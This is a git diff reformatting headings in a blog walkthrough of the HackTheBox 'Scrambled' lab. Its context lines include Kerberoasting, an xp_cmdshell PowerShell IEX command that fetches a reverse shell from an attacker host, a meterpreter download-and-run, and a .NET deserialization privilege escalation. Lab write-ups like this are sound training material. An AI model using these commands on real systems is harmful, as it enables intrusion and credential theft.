@@ -1,13 +1,13 @@
 ---
 layout: post
 title: HackTheBox - Scrambled
-category: HackTheBox
+categories: [HackTheBox, Medium]
 date: 2022-10-01 18:31 +0300
+image:
+  path: /assets/hackthebox/scrambled/Scrambled.png
 ---
 
-![Machine logo](/assets/hackthebox/scrambled/Scrambled.png){:height="420px" width="620px"}
-
-# Configuration
+## Configuration
 
 If you're using your own machine like me, you have to access HTB network via `OpenVPN`:
 
@@ -24,9 +24,9 @@ $ echo "10.10.11.168\tscrambled.htb" | sudo tee -a /etc/hosts
 10.10.11.168    scrambled.htb
 ```
 
-# Reconnaissance
+## Reconnaissance
 
-## Port scan
+### Port scan
 
 We start with a port scan. I've decided to remove the masscan because of its problems with infinity wait after the work is done. So the script is changed and now executes only nmap. 
 
@@ -46,7 +46,7 @@ nmap -p$ports -A $1
 ```bash
 $ fnmap 10.10.11.168
 $ cat nmap_scan         
-# Nmap 7.92 scan initiated Mon Sep 26 12:12:19 2022 as: nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49675,49676,49699,49703,60700 -A -oN nmap_scan 10.10.11.168
+## Nmap 7.92 scan initiated Mon Sep 26 12:12:19 2022 as: nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49675,49676,49699,49703,60700 -A -oN nmap_scan 10.10.11.168
 Nmap scan report for 10.10.11.168
 Host is up (0.10s latency).
 
@@ -162,7 +162,7 @@ It can be useful to append domain and domain controller addresses to /etc/hosts
 
 > 10.10.11.168    scrambled.htb scrm.local dc1.scrm.local
 
-## Foothold
+### Foothold
 
 ![Web application](/assets/hackthebox/scrambled/web.png)
 
@@ -182,9 +182,9 @@ On `Password Resets` page we can note that when the user wants to reset his pass
 
 ![Password reset policy](/assets/hackthebox/scrambled/password_policy.png)
 
-# user.txt
+## user.txt
 
-## Use Kerberos authentication
+### Use Kerberos authentication
 
 We've noted that NTLM is disabled on the domain, so we have to use Kerberos authentication. Kerberos is based on the tickets. But to request these tickets we have to specify the username and the password. The most useful tools are made in `impacket scripts`.
 
@@ -199,7 +199,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 $ export KRB5CCNAME=ksimpson.ccache
 ```
 
-## Kerberoasting attack
+### Kerberoasting attack
 
 Our next step is to perform some basic checks like `Kerberoasting` on the user we've found. Kerberoasting can be performed to harvest `Ticket Granting Service` (TGS) tickets for services that run on behalf of user accounts in the AD. In AD every service has its own User Account. So, when we request a TGS, it is encrypted with the service password and we can crack it offline.
 
@@ -218,7 +218,7 @@ john --wordlist=~/tools/rockyou.txt sqlsvc_hash
 ```
 ![sqlsvc password](/assets/hackthebox/scrambled/sqlsvc_hash.png)
 
-## Reverse shell with MSSQL
+### Reverse shell with MSSQL
 
 Our next step is to connect to the MSSQL. But we have to generate a ticket for the service, we can use impacket's `ticketer.py` script. But we have to get a Domain SID to do it. And there is impacket again with `getPac.py` script.
 
@@ -252,7 +252,7 @@ xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<IP
 
 ![Got sqlsvc reverse shell](/assets/hackthebox/scrambled/got_sqlsvc.png)
 
-## Dump MSSQL database
+### Dump MSSQL database
 
 The sqlsvc hasn't got a user.txt flag, so we have to enumerate other user. We can dump the MSSQL datavase with [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL) script. We can upload it on the machine with PowerShell's `wget`, it is an alias for `Invoke-WebRequest` command. We have to specify the address and the output file here.
 
@@ -312,9 +312,9 @@ wget -Uri "http://<IP>:<PORT>/meterpreter.exe" -OutFile meterpreter.exe
 ./meterpreter.exe
 ```
 
-# root.txt
+## root.txt
 
-## Explore the machine
+### Explore the machine
 
 At first we upload [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) to get some info about the machine. With that we can explore that the `ScrambleServer` service is running on port 4411.
 
@@ -329,7 +329,7 @@ cd "C:\Shares\IT\Apps\Sales Order Client"
 download *
 ```
 
-## Explore the ScrambleCorp client application
+### Explore the ScrambleCorp client application
 
 We can check the file is a `.NET` application. So, we have to open it on our local Windows machine. Also, as we know the application is talking with a server on port, we have to connect to HackTheBox VPN on our Windows machine.
 
@@ -351,7 +351,7 @@ There are some orders, also we can paste a new order. We have to do it and then 
 
 The application formats the data with `Binary formatter` and encodes it with `Base64`. Then it sends it to the server with `UPLOAD_ORDER;<payload>` command.
 
-## .NET deserialization attack
+### .NET deserialization attack
 
 As we have seen, the application sends the data in serialized binary base64 format. So, the application performs deserialization on its side. We explored that the application is running as a service on the machine, which means it has `NT AUTHORITY\SYSTEM` rights on the machine.
 
@@ -393,7 +393,7 @@ The box is Pwn3d!
 
 ![Pwn3d!](/assets/hackthebox/scrambled/pwn3d.png){:height="420px" width="620px"}
 
-# Conclusion
+## Conclusion
 
 I've spent a lot of time to figure out how to use impacket correctly 😂. It was cool to learn more about Kerberos authentication and .NET deserialization. I've enjoyed the box a lot!
 
